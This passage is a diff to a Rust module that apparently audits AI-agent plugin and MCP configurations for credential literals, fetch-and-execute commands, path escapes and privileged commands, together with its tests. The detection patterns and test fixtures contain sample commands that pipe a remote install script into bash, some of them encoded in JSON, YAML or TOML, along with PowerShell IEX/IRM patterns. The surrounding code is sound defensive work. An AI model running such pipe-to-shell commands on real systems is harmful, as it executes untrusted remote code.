@@ -7,8 +7,9 @@
 
 use crate::config::{Config, McpServerConfig};
 use crate::diagnostics::{
-    BoundedTraversal, DEFAULT_MAX_TRAVERSAL_ENTRIES, Diagnostic, DiagnosticReport, ScanCoverage,
-    ScanError, ScanErrorCode, ScanStatus, Severity, Span, ValidationRule,
+    BoundedTraversal, DEFAULT_MAX_CONTENT_SIZE, DEFAULT_MAX_FILE_SIZE, DEFAULT_MAX_FILES,
+    DEFAULT_MAX_TRAVERSAL_DEPTH, DEFAULT_MAX_TRAVERSAL_ENTRIES, Diagnostic, DiagnosticReport,
+    ScanCoverage, ScanError, ScanErrorCode, ScanStatus, Severity, Span, ValidationRule,
 };
 use crate::plugins::{PluginAuditSnapshot, PluginManager, PluginMcpApproval};
 use crate::secrets::{
@@ -16,6 +17,7 @@ use crate::secrets::{
     is_header_environment_reference, is_sensitive_key,
 };
 use sha2::{Digest, Sha256};
+use std::collections::{HashMap, VecDeque};
 use std::path::{Path, PathBuf};
 
 /// Detects credential-like literals in configuration files.
@@ -48,43 +50,13 @@ impl ValidationRule for CredentialLiteralRule {
 
         let extension = audit_extension(path);
         let root = &self._root;
-        if extension.as_deref() == Some("toml") {
-            if let Ok(doc) = toml_edit::Document::parse(text) {
-                let starts = std::iter::once(0)
-                    .chain(text.match_indices('\n').map(|(i, _)| i + 1))
-                    .collect::<Vec<_>>();
-                struct Credentials<F>(F);
-                impl<'doc, F: FnMut(&str, &str, usize)> toml_edit::visit::Visit<'doc> for Credentials<F> {
-                    fn visit_table_like_kv(&mut self, key: &'doc str, item: &'doc toml_edit::Item) {
-                        if let (Some(value), Some(span)) = (item.as_str(), item.span()) {
-                            (self.0)(key, value, span.start);
-                        }
-                        toml_edit::visit::visit_table_like_kv(self, key, item);
-                    }
-                }
-                let mut visitor = Credentials(|key: &str, value: &str, offset| {
-                    if is_sensitive_key(key)
-                        && is_literal_sensitive_value(key, value)
-                        && looks_like_secret(value)
-                    {
-                        let line = starts.partition_point(|start| *start <= offset) as u32;
-                        diagnostics.push(credential_diagnostic(root, path, key, line));
-                    }
-                });
-                toml_edit::visit::Visit::visit_table(&mut visitor, doc.as_table());
-            }
-            return diagnostics;
-        }
-        if let Some(ext @ ("json" | "yaml" | "yml")) = extension.as_deref()
-            && let Some(value) = parse_structured_value(ext, text)
+        if let Some(extension @ ("json" | "yaml" | "yml" | "toml")) = extension.as_deref()
+            && let Some(value) = parse_structured_value(extension, text)
         {
-            let mut locations = credential_locations(text);
+            let mut locations = CredentialLocationIndex::new(text, extension);
             collect_structured_credentials(&value, &mut |key, value| {
-                let line = locations
-                    .get_mut(key)
-                    .and_then(|lines| lines.pop_front())
-                    .unwrap_or(1);
                 if is_literal_sensitive_value(key, value) && looks_like_secret(value) {
+                    let line = locations.line_for_key(key, value);
                     diagnostics.push(credential_diagnostic(root, path, key, line));
                 }
             });
@@ -172,27 +144,120 @@ fn collect_structured_credentials(value: &serde_json::Value, visit: &mut impl Fn
     }
 }
 
-fn credential_locations(
-    text: &str,
-) -> std::collections::HashMap<&str, std::collections::VecDeque<u32>> {
-    use std::sync::LazyLock;
-    static KEY: LazyLock<regex::Regex> = LazyLock::new(|| {
-        regex::Regex::new(r#"(?:^|[\s,{.])["']?([\w.-]+)["']?\s*[:=]"#)
-            .expect("static credential key regex")
-    });
-    let mut locations = std::collections::HashMap::<_, std::collections::VecDeque<_>>::new();
-    for (index, line) in text.lines().enumerate() {
-        for hit in KEY.captures_iter(line) {
-            let (_, [key]) = hit.extract();
-            if is_sensitive_key(key) {
+struct CredentialLocationIndex {
+    locations: HashMap<String, VecDeque<u32>>,
+    locations_by_value: HashMap<(String, String), VecDeque<u32>>,
+}
+
+impl CredentialLocationIndex {
+    fn new(text: &str, extension: &str) -> Self {
+        let mut locations = HashMap::<String, VecDeque<u32>>::new();
+        let mut locations_by_value = HashMap::<(String, String), VecDeque<u32>>::new();
+        for (index, line) in text.lines().enumerate() {
+            let line_number = (index + 1) as u32;
+            let assignments = if extension == "json" {
+                json_string_assignments(line)
+            } else {
+                parse_text_assignment(line).into_iter().collect()
+            };
+            for (key, value) in assignments {
+                let key = decode_structured_scalar(&key).to_ascii_lowercase();
+                let value = decode_structured_scalar(&value);
                 locations
-                    .entry(key)
+                    .entry(key.clone())
                     .or_default()
-                    .push_back((index + 1) as u32);
+                    .push_back(line_number);
+                locations_by_value
+                    .entry((key, fingerprint_key(&value)))
+                    .or_default()
+                    .push_back(line_number);
             }
         }
+        Self {
+            locations,
+            locations_by_value,
+        }
     }
-    locations
+
+    fn line_for_key(&mut self, key: &str, value: &str) -> u32 {
+        let key = key.to_ascii_lowercase();
+        let value_key = (key.clone(), fingerprint_key(value));
+        if let Some(line) = self
+            .locations_by_value
+            .get_mut(&value_key)
+            .and_then(VecDeque::pop_front)
+        {
+            if let Some(locations) = self.locations.get_mut(&key) {
+                locations.retain(|candidate| *candidate != line);
+            }
+            return line;
+        }
+        self.locations
+            .get_mut(&key)
+            .and_then(VecDeque::pop_front)
+            .unwrap_or(1)
+    }
+}
+
+fn decode_structured_scalar(value: &str) -> String {
+    serde_json::from_str::<String>(&format!("\"{value}\"")).unwrap_or_else(|_| value.to_string())
+}
+
+fn json_string_assignments(line: &str) -> Vec<(String, String)> {
+    let bytes = line.as_bytes();
+    let mut assignments = Vec::new();
+    let mut cursor = 0;
+    while cursor < bytes.len() {
+        if bytes[cursor] != b'"' {
+            cursor += 1;
+            continue;
+        }
+        let Some((key, after_key)) = json_string_at(line, cursor) else {
+            cursor += 1;
+            continue;
+        };
+        cursor = after_key;
+        let mut value_start = cursor;
+        while bytes.get(value_start).is_some_and(u8::is_ascii_whitespace) {
+            value_start += 1;
+        }
+        if bytes.get(value_start) != Some(&b':') {
+            continue;
+        }
+        value_start += 1;
+        while bytes.get(value_start).is_some_and(u8::is_ascii_whitespace) {
+            value_start += 1;
+        }
+        if bytes.get(value_start) != Some(&b'"') {
+            continue;
+        }
+        if let Some((value, _)) = json_string_at(line, value_start) {
+            assignments.push((key, value));
+        }
+    }
+    assignments
+}
+
+fn json_string_at(line: &str, start: usize) -> Option<(String, usize)> {
+    let bytes = line.as_bytes();
+    if bytes.get(start) != Some(&b'"') {
+        return None;
+    }
+    let mut cursor = start + 1;
+    let mut escaped = false;
+    while let Some(byte) = bytes.get(cursor) {
+        if escaped {
+            escaped = false;
+        } else if *byte == b'\\' {
+            escaped = true;
+        } else if *byte == b'"' {
+            let end = cursor + 1;
+            let value = serde_json::from_str(&line[start..end]).ok()?;
+            return Some((value, end));
+        }
+        cursor += 1;
+    }
+    None
 }
 
 fn is_literal_sensitive_value(key: &str, value: &str) -> bool {
@@ -332,7 +397,11 @@ impl ValidationRule for FetchAndExecuteRule {
 
         let extension = audit_extension(path);
         let markdown = matches!(extension.as_deref(), Some("md" | "mdx"));
+        let structured_extension = extension
+            .as_deref()
+            .filter(|extension| matches!(*extension, "json" | "yaml" | "yml" | "toml"));
         if !markdown
+            && structured_extension.is_none()
             && !matches!(
                 extension.as_deref(),
                 Some(
@@ -350,10 +419,6 @@ impl ValidationRule for FetchAndExecuteRule {
                         | "pl"
                         | "conf"
                         | "ini"
-                        | "json"
-                        | "yaml"
-                        | "yml"
-                        | "toml"
                 )
             )
         {
@@ -381,73 +446,90 @@ impl ValidationRule for FetchAndExecuteRule {
             (&["iex", "irm"], "PowerShell IEX with IRM"),
         ];
 
-        let structured = extension
-            .as_deref()
-            .and_then(|ext| parse_structured_value(ext, text));
-        let mut strings = Vec::new();
-        fn collect_strings<'a>(value: &'a serde_json::Value, strings: &mut Vec<&'a str>) {
-            match value {
-                serde_json::Value::String(s) => strings.push(s),
-                serde_json::Value::Array(items) => {
-                    items.iter().for_each(|v| collect_strings(v, strings))
+        let mut commands = Vec::<(u32, String)>::new();
+        if let Some(extension) = structured_extension {
+            let Some(value) = parse_structured_value(extension, text) else {
+                return diagnostics;
+            };
+            let mut strings = Vec::new();
+            collect_structured_strings(&value, &mut strings);
+            for command in strings {
+                let line = text
+                    .lines()
+                    .position(|source_line| source_line.contains(&command))
+                    .map(|index| (index + 1) as u32)
+                    .unwrap_or(1);
+                commands.push((line, command));
+            }
+        } else {
+            let lines = text.lines().collect::<Vec<_>>();
+            let mut line_index = 0;
+            while line_index < lines.len() {
+                if !markdown && shell_comment_only(lines[line_index]) {
+                    line_index += 1;
+                    continue;
                 }
-                serde_json::Value::Object(fields) => {
-                    fields.values().for_each(|v| collect_strings(v, strings))
+                let first_line = line_index;
+                let mut command = lines[line_index].trim_end().to_string();
+                while command.trim_end().ends_with('\\') && line_index + 1 < lines.len() {
+                    command.truncate(command.trim_end().len());
+                    command.pop();
+                    line_index += 1;
+                    if line_index == lines.len()
+                        || (!markdown && shell_comment_only(lines[line_index]))
+                    {
+                        break;
+                    }
+                    command.push(' ');
+                    command.push_str(lines[line_index].trim());
                 }
-                _ => {}
+                commands.push(((first_line + 1) as u32, command));
+                line_index += 1;
             }
         }
-        let lines = if let Some(value) = &structured {
-            collect_strings(value, &mut strings);
-            strings
-        } else {
-            text.lines().collect()
-        };
-        let mut line_index = 0;
-        while line_index < lines.len() {
-            let first_line = line_index;
-            let mut command = lines[line_index].trim().to_string();
-            if !markdown
-                && command
-                    .trim_start_matches('>')
-                    .trim_start()
-                    .starts_with('#')
-            {
-                line_index += 1;
-                continue;
-            }
-            while structured.is_none()
-                && command.trim_end().ends_with('\\')
-                && line_index + 1 < lines.len()
-            {
-                command.truncate(command.trim_end().trim_end_matches('\\').len());
-                line_index += 1;
-                command.push(' ');
-                command.push_str(lines[line_index].trim());
-            }
-            let trimmed = command.trim_start_matches('>').trim().to_lowercase();
 
+        for (line, command) in commands {
+            let trimmed = command.trim_start_matches('>').trim().to_lowercase();
             if let Some((_, description)) = patterns
                 .iter()
                 .find(|(substrings, _)| substrings.iter().all(|part| trimmed.contains(*part)))
             {
                 let relative_path = portable_path(&self._root, path);
-                let line = (first_line + 1) as u32;
                 diagnostics.push(Diagnostic {
                     rule_id: self.rule_id().to_string(),
                     target: None,
                     severity: self.default_severity(),
                     source_path: relative_path.clone(),
-                    span: structured.is_none().then(|| Span::line(line)),
+                    span: Some(Span::line(line)),
                     message: format!("Risky fetch-and-execute pattern: {description}"),
                     evidence: Some(format!("Detected pattern: {description}")),
                     fingerprint: fingerprint(self.rule_id(), &relative_path, line, description),
                 });
             }
-            line_index += 1;
         }
 
         diagnostics
+    }
+}
+
+fn shell_comment_only(line: &str) -> bool {
+    line.trim_start().starts_with('#')
+}
+
+fn collect_structured_strings(value: &serde_json::Value, strings: &mut Vec<String>) {
+    match value {
+        serde_json::Value::String(value) => strings.push(value.clone()),
+        serde_json::Value::Object(fields) => {
+            for value in fields.values() {
+                collect_structured_strings(value, strings);
+            }
+        }
+        serde_json::Value::Array(values) => {
+            for value in values {
+                collect_structured_strings(value, strings);
+            }
+        }
+        _ => {}
     }
 }
 
@@ -615,26 +697,27 @@ fn path_reference_escapes_root(root: &Path, source_path: &Path, reference: &str)
         parent.join(reference_path)
     };
 
-    let mut candidate = root.to_path_buf();
+    let mut components = Vec::new();
     for component in relative_path.components() {
         match component {
             std::path::Component::CurDir => {}
             std::path::Component::ParentDir => {
-                if candidate == root {
+                if components.pop().is_none() {
                     return true;
                 }
-                candidate.pop();
             }
-            std::path::Component::Normal(name) => {
-                candidate.push(name);
-                match std::fs::symlink_metadata(&candidate) {
-                    Ok(meta) if meta.file_type().is_symlink() => return true,
+            std::path::Component::Normal(component) => {
+                components.push(component.to_os_string());
+                let mut candidate = root.to_path_buf();
+                candidate.extend(&components);
+                match std::fs::symlink_metadata(candidate) {
+                    Ok(metadata) if metadata.file_type().is_symlink() => return true,
                     Ok(_) => {}
-                    Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
+                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                     Err(_) => return true,
                 }
             }
-            _ => return true,
+            std::path::Component::RootDir | std::path::Component::Prefix(_) => return true,
         }
     }
     false
@@ -704,6 +787,7 @@ pub fn audit_mcp_server(
     source_path: &str,
 ) -> Vec<Diagnostic> {
     let mut diagnostics = Vec::new();
+    let server_key = fingerprint_key(name);
 
     // Check env values
     for (key, value) in &server.env {
@@ -726,7 +810,7 @@ pub fn audit_mcp_server(
                     "credential-literal",
                     source_path,
                     0,
-                    &format!("{name}\0env:{}", fingerprint_key(key)),
+                    &format!("server:{server_key}\0env:{}", fingerprint_key(key)),
                 ),
             });
         }
@@ -754,7 +838,7 @@ pub fn audit_mcp_server(
                     "credential-literal",
                     source_path,
                     0,
-                    &format!("{name}\0header:{}", fingerprint_key(key)),
+                    &format!("server:{server_key}\0header:{}", fingerprint_key(key)),
                 ),
             });
         }
@@ -791,7 +875,7 @@ pub fn audit_mcp_server(
                     "credential-literal",
                     source_path,
                     0,
-                    &format!("{name}\0args:{}", fingerprint_key(key)),
+                    &format!("server:{server_key}\0args:{}", fingerprint_key(key)),
                 ),
             });
         }
@@ -817,7 +901,12 @@ pub fn audit_mcp_server_state(
             span: None,
             message: "Plugin MCP server has not been explicitly approved".to_string(),
             evidence: Some("MCP approval is pending".to_string()),
-            fingerprint: fingerprint("mcp-approval-pending", source_path, 0, name),
+            fingerprint: fingerprint(
+                "mcp-approval-pending",
+                source_path,
+                0,
+                &fingerprint_key(name),
+            ),
         });
     }
 
@@ -836,7 +925,7 @@ pub fn audit_mcp_server_state(
             span: None,
             message: "MCP server command contains a potentially privileged operation".to_string(),
             evidence: Some("Structured command declaration matched a privilege rule".to_string()),
-            fingerprint: fingerprint("mcp-privilege", source_path, 0, name),
+            fingerprint: fingerprint("mcp-privilege", source_path, 0, &fingerprint_key(name)),
         });
     }
     diagnostics
@@ -856,18 +945,14 @@ fn fingerprint_key(key: &str) -> String {
 
 /// Run all audit rules on a directory.
 pub fn audit_directory(root: &Path) -> DiagnosticReport {
-    audit_directory_inner(root, None, None)
+    audit_directory_inner(root, None)
 }
 
 pub fn audit_directory_for_target(root: &Path, target: &str) -> DiagnosticReport {
-    audit_directory_inner(root, Some(target), None)
+    audit_directory_inner(root, Some(target))
 }
 
-fn audit_directory_inner(
-    root: &Path,
-    target: Option<&str>,
-    mut hashes: Option<std::collections::BTreeMap<PathBuf, [u8; 32]>>,
-) -> DiagnosticReport {
+fn audit_directory_inner(root: &Path, target: Option<&str>) -> DiagnosticReport {
     let mut all_diagnostics = Vec::new();
     let mut unsupported_errors = Vec::new();
     let mut unsupported_files = 0;
@@ -881,20 +966,7 @@ fn audit_directory_inner(
 
     let traversal = BoundedTraversal::new();
 
-    let mut drift = false;
     let traversal_report = traversal.traverse_with_report(root, |path, content| {
-        if let Some(expected) = hashes.as_mut() {
-            let digest: [u8; 32] = Sha256::digest(content).into();
-            if path
-                .strip_prefix(root)
-                .ok()
-                .and_then(|p| expected.remove(p))
-                != Some(digest)
-            {
-                drift = true;
-                return false;
-            }
-        }
         if let Some(code) = unsupported_content(path, content) {
             unsupported_files += 1;
             unsupported_errors.push(ScanError::new(code, Some(portable_path(root, path))));
@@ -907,12 +979,6 @@ fn audit_directory_inner(
         true
     });
 
-    if drift || hashes.is_some_and(|remaining| !remaining.is_empty()) {
-        return incomplete_scan_report(
-            ScanError::new(ScanErrorCode::PluginTrustUnavailable, None)
-                .with_target(target.unwrap_or_default()),
-        );
-    }
     let mut coverage = traversal_report.coverage;
     coverage.files_scanned = coverage.files_scanned.saturating_sub(unsupported_files);
     coverage.files_skipped += unsupported_files;
@@ -987,12 +1053,22 @@ pub fn audit_plugin_selection(project_root: &Path, selection: &str) -> Diagnosti
 }
 
 pub fn audit_all(project_root: &Path) -> DiagnosticReport {
-    if crate::diagnostics::open_root_directory(project_root).is_err() {
-        return incomplete_scan_report(ScanError::new(ScanErrorCode::RootReadFailed, None));
-    }
     let mut findings = Vec::new();
     let mut scan_errors = Vec::new();
     let mut coverage = ScanCoverage::default();
+
+    match std::fs::symlink_metadata(project_root) {
+        Ok(metadata) if metadata.file_type().is_symlink() => {
+            return incomplete_scan_report(ScanError::new(ScanErrorCode::SymlinkSkipped, None));
+        }
+        Ok(metadata) if !metadata.is_dir() => {
+            return incomplete_scan_report(ScanError::new(ScanErrorCode::RootReadFailed, None));
+        }
+        Ok(_) => {}
+        Err(_) => {
+            return incomplete_scan_report(ScanError::new(ScanErrorCode::RootReadFailed, None));
+        }
+    }
 
     let agents_root = project_root.join(".agents");
     match std::fs::symlink_metadata(&agents_root) {
@@ -1145,17 +1221,13 @@ fn inspect_plugin_inventory(
         }
         return Ok((Vec::new(), None));
     };
-    let parent =
-        crate::diagnostics::open_root_directory(config_path.parent().unwrap_or(project_root))?;
-    let file =
-        crate::diagnostics::open_entry_nofollow(&parent, std::ffi::OsStr::new("agentsync.toml"))?;
-    let config = Config::load_opened(&config_path, file.into_std())?;
+    let config = Config::load(&config_path)?;
     let manager = PluginManager::new(
         Config::project_root(&config_path),
         config_path,
         config.plugins.clone(),
     );
-    let snapshots = manager.inspect_audit_snapshots_read_only(selection, &parent)?;
+    let snapshots = manager.inspect_audit_snapshots_read_only(selection)?;
     Ok((snapshots, Some(config)))
 }
 
@@ -1165,36 +1237,95 @@ fn aggregate_plugin_snapshots(snapshots: Vec<PluginAuditSnapshot>) -> Diagnostic
     let mut coverage = ScanCoverage::default();
 
     for snapshot in snapshots {
-        let report = audit_directory_inner(
-            &snapshot.root,
-            Some(&snapshot.identity),
-            Some(snapshot.hashes),
-        );
-        let trusted = !report
-            .scan_errors
-            .iter()
-            .flatten()
-            .any(|e| e.code == ScanErrorCode::PluginTrustUnavailable);
+        let report = audit_captured_files(&snapshot.root, &snapshot.identity, snapshot.files);
         merge_report(report, &mut findings, &mut scan_errors, &mut coverage);
-        if !trusted {
-            continue;
-        }
         for server in snapshot.servers {
-            let mut diagnostics = audit_mcp_server_state(
-                server
-                    .name
-                    .strip_prefix(&format!("{}/", snapshot.identity))
-                    .unwrap_or(&server.name),
-                &server.server,
-                ".mcp.json",
-                server.approval,
-            );
+            let mut diagnostics =
+                audit_mcp_server_state(&server.name, &server.server, ".mcp.json", server.approval);
             diagnostics.retain(should_include_mcp_state_finding);
             apply_target(&mut diagnostics, &snapshot.identity);
             findings.extend(diagnostics);
         }
     }
 
+    finish_scan_report(findings, coverage, scan_errors)
+}
+
+fn audit_captured_files(
+    root: &Path,
+    target: &str,
+    mut files: Vec<(PathBuf, Vec<u8>)>,
+) -> DiagnosticReport {
+    files.sort_by(|left, right| left.0.cmp(&right.0));
+    let rules: Vec<Box<dyn ValidationRule>> = vec![
+        Box::new(CredentialLiteralRule::new(root)),
+        Box::new(FetchAndExecuteRule::new(root)),
+        Box::new(FileTraversalRule::new(root)),
+        Box::new(McpPrivilegeRule::new(root)),
+    ];
+    let mut findings = Vec::new();
+    let mut scan_errors = Vec::new();
+    let mut coverage = ScanCoverage {
+        targets_discovered: 1,
+        targets_scanned: 1,
+        files_discovered: files.len(),
+        ..ScanCoverage::default()
+    };
+    let mut bytes_consumed = 0u64;
+
+    for (index, (relative_path, content)) in files.iter().enumerate() {
+        let full_path = root.join(relative_path);
+        let source_path = portable_path(root, &full_path);
+        if index >= DEFAULT_MAX_FILES {
+            coverage.files_skipped += files.len() - index;
+            scan_errors.push(ScanError::new(
+                ScanErrorCode::MaxFilesExceeded,
+                Some(source_path),
+            ));
+            break;
+        }
+        if relative_path.components().count() > DEFAULT_MAX_TRAVERSAL_DEPTH {
+            coverage.files_skipped += 1;
+            scan_errors.push(ScanError::new(
+                ScanErrorCode::MaxDepthExceeded,
+                Some(source_path),
+            ));
+            continue;
+        }
+        if content.len() > DEFAULT_MAX_FILE_SIZE {
+            coverage.files_skipped += 1;
+            scan_errors.push(ScanError::new(
+                ScanErrorCode::MaxFileSizeExceeded,
+                Some(source_path),
+            ));
+            continue;
+        }
+        let remaining_size = (DEFAULT_MAX_CONTENT_SIZE as u64).saturating_sub(bytes_consumed);
+        if content.len() as u64 > remaining_size {
+            coverage.files_skipped += 1;
+            scan_errors.push(ScanError::new(
+                ScanErrorCode::MaxContentSizeExceeded,
+                Some(source_path),
+            ));
+            continue;
+        }
+        bytes_consumed += content.len() as u64;
+        coverage.bytes_scanned += content.len() as u64;
+        if let Some(code) = unsupported_content(&full_path, content) {
+            coverage.files_skipped += 1;
+            scan_errors.push(ScanError::new(code, Some(source_path)));
+            continue;
+        }
+        coverage.files_scanned += 1;
+        for rule in &rules {
+            findings.extend(rule.check_file(&full_path, content));
+        }
+    }
+
+    apply_target(&mut findings, target);
+    for error in &mut scan_errors {
+        error.target = Some(target.to_string());
+    }
     finish_scan_report(findings, coverage, scan_errors)
 }
 
@@ -1296,8 +1427,8 @@ fn unsupported_content(path: &Path, content: &[u8]) -> Option<ScanErrorCode> {
     };
     let extension = audit_extension(path);
     match extension.as_deref() {
-        Some(ext @ ("json" | "yaml" | "yml" | "toml")) => {
-            let valid = parse_structured_value(ext, text).is_some();
+        Some(extension @ ("json" | "yaml" | "yml" | "toml")) => {
+            let valid = parse_structured_value(extension, text).is_some();
             (!valid).then_some(ScanErrorCode::UnsupportedContent)
         }
         Some(
@@ -1341,45 +1472,6 @@ mod tests {
     use std::collections::BTreeMap;
     use std::fs;
     use tempfile::TempDir;
-
-    #[test]
-    fn repeated_toml_keys_keep_their_source_locations() {
-        let root = Path::new(".");
-        let findings = CredentialLiteralRule::new(root).check_file(
-            Path::new("./config.toml"),
-            br#"
-[z]
-api_key = "${SKIP_ME}"
-[b]
-api_key = "synthetic-test-credential-1234"
-[a]
-api_key = "synthetic-test-credential-1234"
-"#,
-        );
-        assert_eq!(
-            findings
-                .iter()
-                .map(|f| f.span.as_ref().unwrap().line)
-                .collect::<Vec<_>>(),
-            [5, 7]
-        );
-        assert_ne!(findings[0].fingerprint, findings[1].fingerprint);
-    }
-
-    #[test]
-    fn plugin_scan_rejects_same_length_drift() {
-        let temp = TempDir::new().unwrap();
-        let path = temp.path().join("run.sh");
-        let original = b"echo ok";
-        fs::write(path, b"echo no").unwrap();
-        let hashes = BTreeMap::from([(PathBuf::from("run.sh"), Sha256::digest(original).into())]);
-        let report = audit_directory_inner(temp.path(), Some("plugin/test/demo"), Some(hashes));
-        assert_eq!(report.status, Some(ScanStatus::Incomplete));
-        assert_eq!(
-            report.scan_errors.unwrap()[0].code,
-            ScanErrorCode::PluginTrustUnavailable
-        );
-    }
 
     #[test]
     fn skill_directory_entry_errors_are_retained_as_scan_errors() {
@@ -1475,6 +1567,248 @@ curl | bash
 
         assert!(!diagnostics.is_empty());
         assert_eq!(diagnostics[0].rule_id, "fetch-and-execute");
+    }
+
+    #[test]
+    fn captured_plugin_files_are_audited_from_the_checked_bytes() {
+        let temp_dir = TempDir::new().unwrap();
+        let root = temp_dir.path().join("plugin");
+        fs::create_dir(&root).unwrap();
+        fs::write(root.join("setup.sh"), "echo safe\n").unwrap();
+        let files = vec![(
+            PathBuf::from("setup.sh"),
+            b"curl https://example.invalid/install.sh | bash\n".to_vec(),
+        )];
+        fs::write(root.join("setup.sh"), "echo changed after lock check\n").unwrap();
+
+        let report = audit_captured_files(&root, "plugin/internal/engineering", files);
+
+        assert!(report.findings.iter().any(|finding| {
+            finding.rule_id == "fetch-and-execute" && finding.span.as_ref().unwrap().line == 1
+        }));
+    }
+
+    #[test]
+    fn plugin_audit_snapshot_uses_verified_bytes_after_in_place_edit_or_replacement() {
+        fn copy_tree(source: &Path, target: &Path) {
+            fs::create_dir_all(target).unwrap();
+            for entry in fs::read_dir(source).unwrap() {
+                let entry = entry.unwrap();
+                let source_path = entry.path();
+                let target_path = target.join(entry.file_name());
+                if source_path.is_dir() {
+                    copy_tree(&source_path, &target_path);
+                } else {
+                    fs::copy(source_path, target_path).unwrap();
+                }
+            }
+        }
+
+        let temp_dir = TempDir::new().unwrap();
+        let project_root = temp_dir.path().join("project");
+        let marketplace = project_root.join("marketplace");
+        copy_tree(
+            &PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/plugin-marketplace"),
+            &marketplace,
+        );
+        let install_script = marketplace.join("plugins/engineering/skills/review/install.sh");
+        fs::write(
+            &install_script,
+            "curl https://example.invalid/install.sh | bash\n",
+        )
+        .unwrap();
+
+        let config_path = project_root.join(".agents/agentsync.toml");
+        fs::create_dir_all(config_path.parent().unwrap()).unwrap();
+        fs::write(
+            &config_path,
+            r#"
+[plugins]
+enabled = true
+lockfile = "plugins.lock.toml"
+
+[plugins.marketplaces.internal]
+source = "../marketplace"
+reference = "main"
+
+[[plugins.selections]]
+marketplace = "internal"
+plugin = "engineering"
+"#,
+        )
+        .unwrap();
+        let config = Config::load(&config_path).unwrap();
+        let selection = crate::plugins::PluginSelection {
+            marketplace: "internal".to_string(),
+            plugin: "engineering".to_string(),
+        };
+        let manager = PluginManager::new(project_root, config_path, config.plugins);
+        manager.add(&selection).unwrap();
+        let snapshots = manager.inspect_audit_snapshots_read_only(None).unwrap();
+
+        fs::write(&install_script, "echo changed in place\n").unwrap();
+        let in_place_report = aggregate_plugin_snapshots(snapshots.clone());
+        assert!(in_place_report.findings.iter().any(|finding| {
+            finding.rule_id == "fetch-and-execute"
+                && finding.source_path == "skills/review/install.sh"
+        }));
+
+        fs::remove_file(&install_script).unwrap();
+        fs::write(&install_script, "echo replacement path content\n").unwrap();
+        let replaced_report = aggregate_plugin_snapshots(snapshots);
+        assert!(replaced_report.findings.iter().any(|finding| {
+            finding.rule_id == "fetch-and-execute"
+                && finding.source_path == "skills/review/install.sh"
+        }));
+    }
+
+    #[test]
+    fn structured_fetch_rules_match_decoded_strings() {
+        let temp_dir = TempDir::new().unwrap();
+        let rule = FetchAndExecuteRule::new(temp_dir.path());
+
+        for (name, content) in [
+            (
+                "command.json",
+                br#"{"command":"curl https://example.invalid/install.sh \u007c bash"}"#.as_slice(),
+            ),
+            (
+                "command.yaml",
+                br#"command: "curl https://example.invalid/install.sh \u007c bash""#.as_slice(),
+            ),
+            (
+                "command.toml",
+                br#"command = "curl https://example.invalid/install.sh \u007c bash""#.as_slice(),
+            ),
+        ] {
+            let findings = rule.check_file(Path::new(name), content);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == "fetch-and-execute"),
+                "decoded command in {name} was not detected"
+            );
+        }
+    }
+
+    #[test]
+    fn comment_only_line_does_not_consume_the_following_command() {
+        let temp_dir = TempDir::new().unwrap();
+        let rule = FetchAndExecuteRule::new(temp_dir.path());
+        let findings = rule.check_file(
+            Path::new("setup.sh"),
+            b"# comment with a continuation \\\ncurl https://example.invalid/install.sh | bash\n",
+        );
+
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].span.as_ref().unwrap().line, 2);
+
+        let findings = rule.check_file(
+            Path::new("setup.sh"),
+            b"echo setup \\\n# comment-only line\ncurl https://example.invalid/install.sh | bash\n",
+        );
+
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].span.as_ref().unwrap().line, 3);
+
+        let findings = rule.check_file(
+            Path::new("setup.sh"),
+            b"curl https://example.invalid/install.sh \\\n| bash\n",
+        );
+
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].span.as_ref().unwrap().line, 1);
+    }
+
+    #[test]
+    fn repeated_toml_credentials_keep_distinct_locations_and_fingerprints() {
+        let temp_dir = TempDir::new().unwrap();
+        let rule = CredentialLiteralRule::new(temp_dir.path());
+        let content = br#"[zeta]
+api_key = "SYNTHETIC_TOML_SECRET_FIRST_24bd"
+
+[alpha]
+api_key = "SYNTHETIC_TOML_SECRET_SECOND_5d91"
+"#;
+
+        let findings = rule.check_file(Path::new("config.toml"), content);
+
+        let lines = findings
+            .iter()
+            .map(|finding| finding.span.as_ref().unwrap().line)
+            .collect::<Vec<_>>();
+        assert_eq!(lines, vec![5, 2]);
+        assert_ne!(findings[0].fingerprint, findings[1].fingerprint);
+        assert!(
+            findings
+                .iter()
+                .all(|finding| { !finding.fingerprint.contains("SYNTHETIC_TOML_SECRET") })
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn path_reference_checks_components_before_parent_normalization() {
+        use std::os::unix::fs::symlink;
+
+        let temp_dir = TempDir::new().unwrap();
+        let root = temp_dir.path().join("root");
+        fs::create_dir_all(root.join("sub")).unwrap();
+        fs::write(root.join("notes.txt"), "notes").unwrap();
+        let source = root.join("README.md");
+
+        assert!(!path_reference_escapes_root(
+            &root,
+            &source,
+            "sub/../notes.txt"
+        ));
+
+        fs::remove_dir(root.join("sub")).unwrap();
+        let external = temp_dir.path().join("external");
+        fs::create_dir(&external).unwrap();
+        symlink(&external, root.join("sub")).unwrap();
+
+        assert!(path_reference_escapes_root(
+            &root,
+            &source,
+            "sub/../notes.txt"
+        ));
+    }
+
+    #[test]
+    fn mcp_fingerprints_distinguish_servers_but_are_stable_per_server() {
+        let server = McpServerConfig {
+            command: Some("sudo fixture".to_string()),
+            args: Vec::new(),
+            env: BTreeMap::from([(
+                "API_KEY".to_string(),
+                "SYNTHETIC_MCP_SECRET_FOR_FINGERPRINT_TEST_813b".to_string(),
+            )]),
+            headers: BTreeMap::new(),
+            disabled: false,
+            url: None,
+            transport_type: None,
+        };
+        let first =
+            audit_mcp_server_state("first", &server, ".mcp.json", PluginMcpApproval::Pending);
+        let second =
+            audit_mcp_server_state("second", &server, ".mcp.json", PluginMcpApproval::Pending);
+        let repeated =
+            audit_mcp_server_state("first", &server, ".mcp.json", PluginMcpApproval::Pending);
+        let fingerprints = |findings: &[Diagnostic]| {
+            findings
+                .iter()
+                .map(|finding| (finding.rule_id.clone(), finding.fingerprint.clone()))
+                .collect::<Vec<_>>()
+        };
+
+        assert_ne!(fingerprints(&first), fingerprints(&second));
+        assert_eq!(fingerprints(&first), fingerprints(&repeated));
+        assert!(first.iter().all(|finding| {
